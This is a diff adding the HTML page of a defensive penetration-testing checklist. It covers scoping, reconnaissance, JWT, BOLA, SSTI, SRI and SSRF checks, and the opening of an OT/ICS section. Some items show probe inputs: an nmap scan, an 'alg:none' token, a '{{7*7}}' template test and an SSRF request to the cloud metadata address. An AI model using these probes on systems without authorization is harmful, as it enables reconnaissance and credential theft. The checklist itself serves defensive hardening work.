@@ -1,0 +1,1322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<!-- Google tag (gtag.js) - Consent Mode v2 -->
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('consent', 'default', {
+  'ad_storage': 'denied',
+  'ad_user_data': 'denied',
+  'ad_personalization': 'denied',
+  'analytics_storage': 'denied'
+});
+gtag('js', new Date());
+gtag('config', 'G-PDC7X9K3QM');
+</script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-PDC7X9K3QM"></script>
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Penetration-Defense-Checklist — A Modern Hardening Checklist for Security Researchers</title>
+<meta name="description" content="A source-linked, modern penetration testing and defense checklist covering recon, vulnerability analysis, OT/ICS, Active Directory, cloud/edge infrastructure, post-exploitation detection, defensive tooling, and 39 real-world incident lessons — mapped to CISA KEV, MITRE D3FEND, NIST CSF 2.0, OWASP, and CSIS.">
+<meta name="keywords" content="penetration testing checklist, defense checklist, cybersecurity hardening, CISA KEV, MITRE D3FEND, NIST CSF, OWASP, Active Directory security, OT ICS security, cloud security checklist, blue team, red team">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="https://sauerninja.github.io/Penetration-Defense-Checklist/">
+
+<!-- Open Graph -->
+<meta property="og:type" content="article">
+<meta property="og:title" content="Penetration-Defense-Checklist — A Modern Hardening Checklist for Security Researchers">
+<meta property="og:description" content="A source-linked, modern penetration testing and defense checklist covering recon, vulnerability analysis, OT/ICS, Active Directory, cloud/edge infrastructure, post-exploitation detection, and defensive tooling.">
+<meta property="og:url" content="https://sauerninja.github.io/Penetration-Defense-Checklist/">
+<meta property="og:image" content="https://sauerninja.github.io/Penetration-Defense-Checklist/og-image.png">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="630">
+<meta property="og:image:alt" content="Penetration-Defense-Checklist — green-on-black HUD eye artwork with title text">
+<meta property="og:site_name" content="Penetration-Defense-Checklist">
+
+<!-- Twitter -->
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Penetration-Defense-Checklist — A Modern Hardening Checklist for Security Researchers">
+<meta name="twitter:description" content="Source-linked recon-to-defense checklist mapped to CISA KEV, MITRE D3FEND, NIST CSF 2.0, and OWASP.">
+<meta name="twitter:image" content="https://sauerninja.github.io/Penetration-Defense-Checklist/og-image.png">
+
+<!-- Icons -->
+<link rel="icon" type="image/x-icon" href="favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="favicon-16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="favicon-32.png">
+<link rel="apple-touch-icon" sizes="180x180" href="apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="512x512" href="icon-512.png">
+<link rel="preload" as="image" href="hero.png">
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Penetration-Defense-Checklist: A Modern Hardening Checklist for Security Researchers",
+  "description": "A source-linked penetration testing and defense checklist covering reconnaissance, vulnerability analysis, OT/ICS hardening, Active Directory defense, cloud and edge infrastructure, post-exploitation detection, and defensive tooling.",
+  "image": "https://sauerninja.github.io/Penetration-Defense-Checklist/og-image.png",
+  "author": { "@type": "Person", "name": "Setvin Noether", "url": "https://github.com/SauerNinja" },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Penetration-Defense-Checklist",
+    "logo": { "@type": "ImageObject", "url": "https://sauerninja.github.io/Penetration-Defense-Checklist/icon-512.png" }
+  },
+  "mainEntityOfPage": "https://sauerninja.github.io/Penetration-Defense-Checklist/",
+  "wordCount": 11200,
+  "timeRequired": "PT42M"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebSite",
+  "name": "Penetration-Defense-Checklist",
+  "url": "https://sauerninja.github.io/Penetration-Defense-Checklist/"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://sauerninja.github.io/Penetration-Defense-Checklist/" }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is the Penetration-Defense-Checklist?",
+      "acceptedAnswer": { "@type": "Answer", "text": "It is a defensive, source-linked checklist that walks security researchers and defenders through the full lifecycle of a modern security assessment — from scoping and reconnaissance through OT/ICS, Active Directory, cloud/edge infrastructure, and post-exploitation detection — with every item mapped to an authoritative framework such as CISA KEV, MITRE D3FEND, NIST CSF 2.0, or OWASP." }
+    },
+    {
+      "@type": "Question",
+      "name": "Is this checklist offensive or defensive in nature?",
+      "acceptedAnswer": { "@type": "Answer", "text": "It is written from a defensive posture. Where an attack technique is referenced (for context on why a control matters), it is paired with the corresponding detection or hardening step rather than exploitation instructions." }
+    },
+    {
+      "@type": "Question",
+      "name": "What frameworks does the checklist reference?",
+      "acceptedAnswer": { "@type": "Answer", "text": "CISA's Known Exploited Vulnerabilities (KEV) Catalog, MITRE D3FEND, MITRE ATT&CK, NIST CSF 2.0, and the OWASP Top 10 for Web and LLM applications, alongside CISA's cybersecurity advisories." }
+    }
+  ]
+}
+</script>
+
+<style>
+:root{
+  --bg:#04070a;
+  --bg-2:#060c08;
+  --green:#39ff14;
+  --green-dim:#1f8a12;
+  --green-deep:#0a3d0a;
+  --ink:#c7f5c9;
+  --ink-dim:#7fae7f;
+  --amber:#ffce54;
+  --card:#050c06;
+  --border:#123a12;
+  --mono: 'IBM Plex Mono', 'Courier New', ui-monospace, monospace;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--bg);
+  color:var(--ink);
+  font-family:var(--mono);
+  line-height:1.65;
+  -webkit-font-smoothing:antialiased;
+}
+
+/* ---------- Reading progress bar ---------- */
+#progress-bar{
+  position:fixed; top:0; left:0; height:3px; width:0%;
+  background:linear-gradient(90deg, var(--green-deep), var(--green), #baffb0);
+  box-shadow:0 0 8px var(--green);
+  z-index:9999;
+  transition:width 0.08s linear;
+}
+
+/* ---------- Matrix binary background ---------- */
+#matrix-canvas{
+  position:fixed; inset:0; width:100%; height:100%;
+  z-index:0; opacity:0.16; pointer-events:none;
+}
+.bg-veil{
+  position:fixed; inset:0; z-index:1; pointer-events:none;
+  background:radial-gradient(ellipse at 50% -10%, rgba(6,20,8,0) 0%, var(--bg) 78%);
+}
+
+a{color:var(--green); text-decoration-color:var(--green-dim);}
+a:hover{color:#baffb0;}
+a:focus-visible, button:focus-visible, summary:focus-visible, input:focus-visible{
+  outline:2px solid var(--green); outline-offset:2px;
+}
+
+.wrap{max-width:960px; margin:0 auto; padding:0 20px; position:relative; z-index:2;}
+
+/* ---------- Header ---------- */
+header.site{
+  padding:14px 0; border-bottom:1px solid var(--border);
+  position:relative; z-index:5; background:rgba(4,7,10,0.85); backdrop-filter:blur(4px);
+}
+header.site .wrap{display:flex; align-items:center; justify-content:space-between; gap:12px;}
+.brand{display:flex; align-items:center; gap:10px; font-weight:700; letter-spacing:0.02em;}
+.brand img{width:28px; height:28px; border-radius:50%; border:1px solid var(--green-dim);}
+.brand .prompt{color:var(--green); }
+nav.top a{color:var(--ink-dim); margin-left:18px; font-size:0.85rem; text-decoration:none;}
+nav.top a:hover{color:var(--green);}
+
+/* ---------- Hero ---------- */
+.hero{position:relative; overflow:hidden; border-bottom:1px solid var(--border);}
+.hero-img-wrap{position:relative; width:100%; aspect-ratio:1568/588; overflow:hidden;}
+.hero-img-wrap img{width:100%; height:100%; object-fit:cover; display:block; filter:saturate(1.1);}
+.hero-scrim{
+  position:absolute; inset:0;
+  background:linear-gradient(180deg, rgba(4,7,10,0.15) 0%, rgba(4,7,10,0.55) 55%, rgba(4,7,10,0.96) 100%),
+             linear-gradient(90deg, rgba(4,7,10,0.85) 0%, rgba(4,7,10,0.15) 55%);
+}
+.hero-content{
+  position:absolute; left:0; right:0; bottom:0; padding:34px 0 30px;
+}
+.eyebrow{
+  color:var(--green); font-size:0.78rem; letter-spacing:0.12em; text-transform:uppercase;
+  border:1px solid var(--green-dim); display:inline-block; padding:4px 10px; border-radius:2px;
+  background:rgba(10,30,10,0.5);
+}
+.eyebrow::before{content:"> "; color:var(--green-dim);}
+h1{
+  font-size:clamp(1.8rem, 4.4vw, 3.1rem); margin:14px 0 10px; color:#e9ffe6;
+  letter-spacing:-0.01em; text-shadow:0 0 18px rgba(57,255,20,0.25);
+}
+.hero p.lede{color:var(--ink); max-width:640px; font-size:1.02rem;}
+.hero-meta{display:flex; gap:18px; flex-wrap:wrap; margin-top:16px; font-size:0.82rem; color:var(--ink-dim);}
+.hero-meta span::before{content:"// "; color:var(--green-dim);}
+
+/* ---------- Sections ---------- */
+main{position:relative; z-index:2;}
+.intro{padding:40px 0 10px;}
+.intro p{color:var(--ink); max-width:760px;}
+.stat-row{display:grid; grid-template-columns:repeat(auto-fit,minmax(150px,1fr)); gap:12px; margin:26px 0;}
+.stat{
+  border:1px solid var(--border); background:var(--card); padding:14px 16px; border-radius:3px;
+}
+.stat .n{color:var(--green); font-size:1.5rem; font-weight:700; display:block;}
+.stat .l{color:var(--ink-dim); font-size:0.76rem; text-transform:uppercase; letter-spacing:0.06em;}
+
+#overall-progress{
+  margin:24px 0 6px; border:1px solid var(--border); background:var(--card);
+  padding:14px 16px; border-radius:3px;
+}
+#overall-progress .bar-track{
+  height:10px; background:#08160a; border:1px solid var(--border); border-radius:5px; overflow:hidden; margin-top:8px;
+}
+#overall-progress .bar-fill{
+  height:100%; width:0%; background:linear-gradient(90deg, var(--green-deep), var(--green));
+  transition:width 0.25s ease;
+}
+#overall-progress .label{display:flex; justify-content:space-between; font-size:0.8rem; color:var(--ink-dim);}
+#overall-progress .label b{color:var(--green); font-weight:700;}
+.reset-btn{
+  background:transparent; border:1px solid var(--green-dim); color:var(--green-dim);
+  font-family:var(--mono); font-size:0.72rem; padding:4px 9px; border-radius:2px; cursor:pointer; margin-left:10px;
+}
+.reset-btn:hover{border-color:var(--green); color:var(--green);}
+
+.toc{
+  border:1px solid var(--border); background:var(--card); border-radius:3px; padding:16px 20px; margin:26px 0 8px;
+}
+.toc h2{font-size:0.8rem; text-transform:uppercase; letter-spacing:0.1em; color:var(--ink-dim); margin:0 0 10px;}
+.toc ol{margin:0; padding-left:1.2rem; columns:2; column-gap:24px;}
+.toc li{margin-bottom:6px; font-size:0.88rem;}
+.toc a{text-decoration:none;}
+.toc a:hover{text-decoration:underline;}
+@media (max-width:600px){.toc ol{columns:1;}}
+
+section.checklist-section{
+  padding:44px 0 6px; border-top:1px solid var(--border); scroll-margin-top:70px;
+}
+.section-head{display:flex; align-items:baseline; gap:14px; flex-wrap:wrap;}
+.section-num{color:var(--green-dim); font-size:0.9rem;}
+.section-head h2{font-size:1.5rem; color:#eafcE6; margin:0;}
+.section-sub{color:var(--ink-dim); max-width:720px; margin:10px 0 22px; font-size:0.94rem;}
+.framework-tag{
+  display:inline-block; font-size:0.7rem; letter-spacing:0.04em; color:var(--bg);
+  background:var(--green-dim); padding:2px 7px; border-radius:2px; margin-left:8px; vertical-align:middle;
+}
+
+.check-item{
+  display:flex; gap:12px; align-items:flex-start; padding:12px 0; border-bottom:1px dashed var(--border);
+}
+.check-item:last-child{border-bottom:none;}
+.check-item input[type=checkbox]{
+  appearance:none; -webkit-appearance:none; width:19px; height:19px; min-width:19px; margin-top:3px;
+  border:1px solid var(--green-dim); background:#061006; border-radius:3px; cursor:pointer; position:relative;
+}
+.check-item input[type=checkbox]:checked{background:var(--green); border-color:var(--green); box-shadow:0 0 8px rgba(57,255,20,0.6);}
+.check-item input[type=checkbox]:checked::after{
+  content:"✓"; position:absolute; left:3px; top:-3px; color:#04220a; font-size:14px; font-weight:900;
+}
+.check-item label{cursor:pointer; flex:1;}
+.check-item .item-title{color:#eafcE6; font-weight:600; display:block; margin-bottom:3px;}
+.check-item.done .item-title, .check-item.done .item-body{opacity:0.5; text-decoration:line-through; text-decoration-color:var(--green-dim);}
+.check-item .item-body{color:var(--ink-dim); font-size:0.9rem;}
+.item-extra{
+  display:block; margin-top:8px; padding:8px 12px; background:#061206; border-left:2px solid var(--green-dim);
+  border-radius:0 3px 3px 0; font-size:0.85rem; color:var(--ink);
+}
+.item-extra b{color:var(--green); font-weight:700; font-size:0.72rem; text-transform:uppercase; letter-spacing:0.04em; display:block; margin-bottom:2px;}
+.item-extra + .item-extra{margin-top:6px;}
+.check-item.done .item-extra{opacity:0.5;}
+.check-item code{
+  background:#081408; color:#a8ffa0; padding:1px 5px; border-radius:2px; font-size:0.85em; border:1px solid var(--border);
+}
+pre{
+  background:#050f06; border:1px solid var(--border); border-radius:4px; padding:14px 16px; overflow-x:auto;
+  font-size:0.84rem; color:#b8ffb0; margin:10px 0 18px;
+}
+pre code{background:none; border:none; padding:0; color:inherit;}
+.src-link{font-size:0.72rem; color:var(--ink-dim); margin-left:2px;}
+.src-link a{color:var(--green-dim);}
+
+/* ---------- Sources / Bibliography ---------- */
+.sources{padding:44px 0; border-top:1px solid var(--border);}
+.sources h2{font-size:1.4rem; color:#eafcE6;}
+.source-grid{display:grid; grid-template-columns:1fr 1fr; gap:0 40px; margin-top:18px;}
+.source-grid h3{font-size:0.82rem; text-transform:uppercase; letter-spacing:0.08em; color:var(--green-dim); border-bottom:1px solid var(--border); padding-bottom:6px; margin-top:22px;}
+.source-grid ul{list-style:none; margin:10px 0; padding:0;}
+.source-grid li{font-size:0.86rem; margin-bottom:9px; padding-left:14px; position:relative;}
+.source-grid li::before{content:"›"; color:var(--green-dim); position:absolute; left:0;}
+@media (max-width:640px){.source-grid{grid-template-columns:1fr;}}
+
+/* ---------- Share bar ---------- */
+.share-bar{
+  display:flex; align-items:center; gap:14px; padding:26px 0; border-top:1px solid var(--border); flex-wrap:wrap;
+}
+.share-bar span{color:var(--ink-dim); font-size:0.82rem;}
+.share-bar a{
+  display:inline-flex; align-items:center; justify-content:center; width:34px; height:34px;
+  border:1px solid var(--border); border-radius:4px; color:var(--green);
+}
+.share-bar a:hover{border-color:var(--green);}
+.share-bar svg{width:16px; height:16px; fill:currentColor;}
+
+/* ---------- Footer ---------- */
+footer.site{
+  border-top:1px solid var(--border); padding:28px 0 60px; margin-top:30px; color:var(--ink-dim); font-size:0.82rem;
+}
+footer.site a{color:var(--green-dim);}
+.byline{margin-top:14px; padding-top:14px; border-top:1px dashed var(--border); font-size:0.8rem; color:var(--ink-dim);}
+
+/* ---------- Cookie banner ---------- */
+#cookie-banner{
+  position:fixed; left:0; right:0; bottom:0; z-index:9998;
+  background:#03110390; backdrop-filter:blur(6px);
+  border-top:1px solid var(--green-dim);
+  padding:14px 20px; display:flex; align-items:center; justify-content:center; gap:16px; flex-wrap:wrap;
+  font-size:0.85rem; color:var(--ink);
+}
+#cookie-banner button{
+  background:var(--green); color:#03220a; border:none; font-family:var(--mono); font-weight:700;
+  padding:8px 18px; border-radius:3px; cursor:pointer; letter-spacing:0.03em;
+}
+#cookie-banner button:hover{background:#baffb0;}
+
+@media (prefers-reduced-motion: reduce){
+  html{scroll-behavior:auto;}
+  #matrix-canvas{display:none;}
+}
+</style>
+</head>
+<body>
+
+<div id="progress-bar"></div>
+<canvas id="matrix-canvas" aria-hidden="true"></canvas>
+<div class="bg-veil" aria-hidden="true"></div>
+
+<header class="site">
+  <div class="wrap">
+    <div class="brand">
+      <img src="favicon-32.png" alt="" aria-hidden="true">
+      <span><span class="prompt">$</span> Penetration-Defense-Checklist</span>
+    </div>
+    <nav class="top">
+      <a href="#toc">Contents</a>
+      <a href="#sources">Sources</a>
+      <a href="https://github.com/SauerNinja/Penetration-Defense-Checklist">GitHub</a>
+    </nav>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="hero-img-wrap">
+    <img src="hero.png" alt="Green HUD-style close-up of an eye overlaid with targeting reticles and binary/hex readouts, representing continuous security monitoring" fetchpriority="high">
+    <div class="hero-scrim"></div>
+  </div>
+  <div class="hero-content">
+    <div class="wrap">
+      <span class="eyebrow">Defensive Security Checklist</span>
+      <h1>Penetration-Defense-Checklist</h1>
+      <p class="lede">A recon-to-remediation hardening checklist for security researchers — every item mapped to an authoritative source: CISA KEV, MITRE D3FEND, MITRE ATT&CK, NIST CSF 2.0, and OWASP.</p>
+      <div class="hero-meta">
+        <span>MIT Licensed</span>
+        <span>~42 min read</span>
+        <span>9 sections · 100+ checklist items</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<main>
+  <div class="wrap">
+    <section class="intro">
+      <p>Most penetration testing cheat sheets go stale within a year — the tools and CVEs age out, but the underlying attack surface keeps shifting toward identity, cloud metadata, edge appliances, and AI infrastructure. This checklist is built the other way around: every item starts from a real, current attack pattern and ends at a concrete, checkable defensive control, sourced to a public framework rather than a blog post. Work it top to bottom on a new engagement, or jump straight to the section that matches what you're hardening today.</p>
+
+      <div class="stat-row">
+        <div class="stat"><span class="n">9</span><span class="l">Sections</span></div>
+        <div class="stat"><span class="n">100+</span><span class="l">Checklist Items</span></div>
+        <div class="stat"><span class="n">5</span><span class="l">Frameworks Cited</span></div>
+        <div class="stat"><span class="n">39</span><span class="l">Foreign-Linked Incidents Cited</span></div>
+      </div>
+
+      <div id="overall-progress">
+        <div class="label">
+          <span>Checklist progress <button class="reset-btn" id="reset-progress" type="button">reset</button></span>
+          <b id="progress-count">0 / 0 complete</b>
+        </div>
+        <div class="bar-track"><div class="bar-fill" id="overall-bar-fill"></div></div>
+      </div>
+    </section>
+
+    <nav class="toc" id="toc" aria-label="Table of contents">
+      <h2>Table of Contents</h2>
+      <ol>
+        <li><a href="#s1">Pre-Engagement &amp; Scope</a></li>
+        <li><a href="#s2">Reconnaissance &amp; Attack Surface Mapping</a></li>
+        <li><a href="#s3">Vulnerability Analysis &amp; Web/API Hardening</a></li>
+        <li><a href="#s4">Critical Infrastructure &amp; OT/ICS</a></li>
+        <li><a href="#s5">Identity &amp; Active Directory Defense</a></li>
+        <li><a href="#s6">Cloud, Container &amp; Edge Infrastructure</a></li>
+        <li><a href="#s7">Post-Exploitation Detection &amp; Lateral Movement</a></li>
+        <li><a href="#s8">Defensive Tooling, Frameworks &amp; Advisories</a></li>
+        <li><a href="#s9">Defending U.S. Infrastructure &amp; Companies From Foreign Hacking</a></li>
+      </ol>
+    </nav>
+
+    <!-- ============ SECTION 1 ============ -->
+    <section class="checklist-section" id="s1">
+      <div class="section-head">
+        <span class="section-num">01</span>
+        <h2>Pre-Engagement &amp; Scope</h2>
+      </div>
+      <p class="section-sub">Before any tooling runs, the boundaries of the engagement need to be explicit and written down — this is what keeps a defensive assessment from becoming an incident.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c1-1"><label for="c1-1">
+          <span class="item-title">Define legal boundaries &amp; rules of engagement (RoE)</span>
+          <span class="item-body">Written authorization, explicit in-scope/out-of-scope asset lists, and an emergency stop contact who can be reached at any hour of the test window.</span>
+        <span class="item-extra"><b>Plain language</b>Get it in writing before you touch anything: who approved this, what's off-limits, and who to call if something breaks.</span><span class="item-extra"><b>Example</b>A signed scope letter naming IP ranges 10.0.4.0/24 and 10.0.5.0/24 as in-scope, with the CISO's cell number as the emergency contact.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c1-2"><label for="c1-2">
+          <span class="item-title">Inventory third-party SaaS, cloud-tenant, and vendor integrations</span>
+          <span class="item-body">Confirm each connected vendor (identity providers, RMM tools, analytics platforms) is either in scope with separate authorization or explicitly excluded.</span>
+        <span class="item-extra"><b>Plain language</b>List every outside app or service that's plugged into your systems, so you know what's actually being tested.</span><span class="item-extra"><b>Example</b>Your Okta tenant, the Slack integration, a payroll vendor's API key, and the CRM's OAuth connection to your email.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c1-3"><label for="c1-3">
+          <span class="item-title">Separate active testing from passive threat-hunting windows</span>
+          <span class="item-body">Active probing and passive log review have different blast radii — schedule and flag them differently so SOC analysts aren't chasing your own traffic.</span>
+        <span class="item-extra"><b>Plain language</b>Don't let 'quietly watching logs' and 'actively poking at systems' happen at the same time without a heads-up to your SOC.</span><span class="item-extra"><b>Example</b>Tell the security team 'we're running active scans Tuesday 9am-5pm' so a 2am alert three weeks later isn't mistaken for your test.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c1-4"><label for="c1-4">
+          <span class="item-title">Confirm data handling &amp; retention rules for anything collected</span>
+          <span class="item-body">Agree up front on how findings, credentials, and any sensitive data touched during the assessment will be stored, encrypted, and destroyed.</span>
+        <span class="item-extra"><b>Plain language</b>Decide up front how test data and findings get stored, who can see them, and when they get deleted.</span><span class="item-extra"><b>Example</b>Encrypt findings reports at rest, store them for 90 days max, and delete any captured credentials immediately after verification.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c1-5"><label for="c1-5">
+          <span class="item-title">Confirm insurance and breach-notification obligations before testing begins</span>
+        <span class="item-extra"><b>Plain language</b>Cyber-insurance policies and some state/federal regulations require notification within specific windows — know those deadlines before an incident forces you to look them up.</span><span class="item-extra"><b>Example</b>Cyber insurance may require notifying the insurer within 24-72 hours of a suspected incident or coverage can be denied — check your policy's actual language now, not during a breach.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 2 ============ -->
+    <section class="checklist-section" id="s2">
+      <div class="section-head">
+        <span class="section-num">02</span>
+        <h2>Reconnaissance &amp; Attack Surface Mapping</h2>
+      </div>
+      <p class="section-sub">You can't defend what you haven't inventoried. This phase builds the asset map an attacker would build — so you can shrink it first.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c2-1"><label for="c2-1">
+          <span class="item-title">Run authenticated network discovery against your own ranges</span>
+          <span class="item-body">Identify every live host, open port, and service banner before an outsider does.
+          <pre><code>nmap -sC -sV -oA scan/discovery &lt;authorized-target-range&gt;</code></pre></span>
+        <span class="item-extra"><b>Plain language</b>Scan your own network the way an attacker would, so you find the open doors before they do.</span><span class="item-extra"><b>Example</b>Run a port scan against your own office and cloud IP ranges and see what shows up — you may find an old test server still listening on port 8080.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c2-2"><label for="c2-2">
+          <span class="item-title">Audit certificate transparency logs for undisclosed subdomains</span>
+          <span class="item-body">CT logs passively reveal forgotten staging environments and shadow subdomains that never made it into asset inventories.</span>
+        <span class="item-extra"><b>Plain language</b>Certificate logs quietly reveal every subdomain your company has ever spun up an SSL certificate for, including ones IT forgot about.</span><span class="item-extra"><b>Example</b>A search of crt.sh for 'yourcompany.com' turns up staging.yourcompany.com, an old marketing microsite nobody's touched since 2022.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c2-3"><label for="c2-3">
+          <span class="item-title">Scan your own public repositories for committed secrets</span>
+          <span class="item-body">Run automated secret-detection across GitHub/GitLab history — API keys and credentials committed once remain in history forever unless purged.</span>
+        <span class="item-extra"><b>Plain language</b>Search your own code history for passwords or API keys someone accidentally committed and never removed.</span><span class="item-extra"><b>Example</b>Tools like TruffleHog or GitLeaks scanning your GitHub org find an AWS secret key committed in a 2021 bugfix and never rotated.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c2-4"><label for="c2-4">
+          <span class="item-title">Map Shadow IT and forgotten legacy endpoints</span>
+          <span class="item-body">Unmanaged endpoints and abandoned test tenants routinely bypass standard security controls — Microsoft's 2024 breach began on exactly this kind of forgotten account. <span class="framework-tag">MITRE ATT&amp;CK</span></span>
+        <span class="item-extra"><b>Plain language</b>Find the servers, apps, and accounts nobody officially owns anymore — they're often the least protected.</span><span class="item-extra"><b>Example</b>An old WordPress marketing site from a 2019 campaign, still online, still running an unpatched plugin, that nobody remembers exists.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c2-5"><label for="c2-5">
+          <span class="item-title">Inventory undocumented cellular modems &amp; out-of-band management links</span>
+          <span class="item-body">Vendor-installed cellular modems and OOB management interfaces routinely bypass routine attack-surface scans entirely.</span>
+        <span class="item-extra"><b>Plain language</b>Vendors sometimes install their own hidden remote-access hardware for 'support' — find out where those are.</span><span class="item-extra"><b>Example</b>A building-automation vendor installed a cellular modem in your server room for remote diagnostics that IT never approved or inventoried.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c2-6"><label for="c2-6">
+          <span class="item-title">Separately enumerate exposed remote-access ports (RDP/SSH) from ordinary web ports</span>
+        <span class="item-extra"><b>Plain language</b>Remote-login ports are a much higher-value target than a normal website — treat anything found there as urgent, not just another open port.</span><span class="item-extra"><b>Example</b>An internet-facing RDP port (3389) found during a scan should trigger same-day investigation, not get lumped in with a routine finding like an open port 80.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 3 ============ -->
+    <section class="checklist-section" id="s3">
+      <div class="section-head">
+        <span class="section-num">03</span>
+        <h2>Vulnerability Analysis &amp; Web/API Hardening</h2>
+      </div>
+      <p class="section-sub">Modern web exploitation has moved from directory brute-forcing to API logic flaws, token abuse, and supply-chain injection.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c3-1"><label for="c3-1">
+          <span class="item-title">Cross-reference all internet-facing software against CISA KEV</span>
+          <span class="item-body">The Known Exploited Vulnerabilities catalog tracks CVEs under active, real-world exploitation — treat it as the non-negotiable patch floor. <span class="framework-tag">CISA KEV</span></span>
+        <span class="item-extra"><b>Plain language</b>Before you patch anything else, patch what's already being actively exploited in the real world.</span><span class="item-extra"><b>Example</b>Check your software versions against CISA's KEV list — if you're running an old Ivanti VPN version on that list, that's this week's priority, not next quarter's.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c3-2"><label for="c3-2">
+          <span class="item-title">Audit JWTs for weak signing, <code>alg:none</code>, and unvalidated <code>kid</code></span>
+          <span class="item-body">Confirm HMAC secrets are high-entropy, algorithm-confusion attacks are rejected server-side, and the <code>kid</code> header can't be used to point at attacker-controlled keys.</span>
+        <span class="item-extra"><b>Plain language</b>Make sure your login tokens can't be forged by tricking the server into skipping its own signature check.</span><span class="item-extra"><b>Example</b>Confirm your API rejects a token with `&quot;alg&quot;:&quot;none&quot;` in the header instead of treating it as trusted.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c3-3"><label for="c3-3">
+          <span class="item-title">Check GraphQL/REST endpoints for BOLA and mass assignment</span>
+          <span class="item-body">Disable introspection in production, enforce object-level authorization on every resolver, and allow-list mutable fields rather than trusting client-supplied payloads.</span>
+        <span class="item-extra"><b>Plain language</b>Make sure one logged-in user can't just change an ID in the URL or request to see someone else's data.</span><span class="item-extra"><b>Example</b>User A is logged in and requests /api/invoices/1002 — if that's actually User B's invoice and it loads anyway, that's BOLA.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c3-4"><label for="c3-4">
+          <span class="item-title">Distinguish standard XSS from Server-Side Template Injection (SSTI)</span>
+          <span class="item-body">Template engines (Jinja2, Twig, Velocity) that render user input directly can escalate straight to remote code execution — treat template contexts as code, not markup.</span>
+        <span class="item-extra"><b>Plain language</b>If user input gets dropped straight into a page template (not just displayed on it), that can let someone run code on your server, not just deface a page.</span><span class="item-extra"><b>Example</b>A 'search term' field that gets rendered through Jinja2 — typing {{7*7}} and getting back 49 instead of the literal text means SSTI is possible.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c3-5"><label for="c3-5">
+          <span class="item-title">Pin and verify third-party CDN scripts with Subresource Integrity</span>
+          <span class="item-body">The 2024 Polyfill.io domain hijack showed how a trusted CDN dependency can silently start serving malicious code to 100,000+ sites. Use SRI hashes on every third-party script tag.</span>
+        <span class="item-extra"><b>Plain language</b>When you load a script from someone else's server, make sure the browser refuses to run it if that file ever changes without your knowledge.</span><span class="item-extra"><b>Example</b>Add an `integrity=&quot;sha384-...&quot;` hash to your `&lt;script src=&quot;https://cdn.example.com/lib.js&quot;&gt;` tag so a hijacked CDN can't silently swap in malware.</span></label>
+      </div>
+      <div class="check-item">
+        <input type="checkbox" id="c3-6"><label for="c3-6">
+          <span class="item-title">Rotate and scope API tokens with short lifespans</span>
+          <span class="item-body">Minimal-permission, short-lived tokens limit blast radius if a repository or CI system is compromised — as in the 2024 Sisense breach, where hardcoded long-lived AWS keys in GitLab enabled full customer data exfiltration.</span>
+        <span class="item-extra"><b>Plain language</b>Don't hand out API keys that work forever and can do everything — give them an expiration date and a narrow job.</span><span class="item-extra"><b>Example</b>A reporting-dashboard integration should get a read-only token that expires in 24 hours, not a permanent key with full account access.</span></label>
+      </div>
+<div class="check-item">
+        <input type="checkbox" id="c3-7"><label for="c3-7">
+          <span class="item-title">Test for Server-Side Request Forgery (SSRF) against internal-only endpoints</span>
+        <span class="item-extra"><b>Plain language</b>Check whether a public-facing form or URL field can be tricked into making your own server fetch something it shouldn't, like internal admin pages or cloud credentials.</span><span class="item-extra"><b>Example</b>Submit a 'website URL' field with a value of http://169.254.169.254/latest/meta-data/ and see if the server actually fetches and returns that internal data.</span></label>
+      </div>
+    </section>
+
+    <!-- ============ SECTION 4 ============ -->
+    <section class="checklist-section" id="s4">
+      <div class="section-head">
+        <span class="section-num">04</span>
+        <h2>Critical Infrastructure &amp; OT/ICS</h2>
+      </div>
+      <p class="section-sub">Water utilities, energy grids, and industrial control systems keep getting breached the same way: internet-exposed PLCs with default credentials. This section closes that door.</p>
+
+      <div class="check-item">
+        <input type="checkbox" id="c4-1"><label for="c4-1">
+          <span class="item-title">Disconnect PLCs and HMIs from the public internet entirely</span>
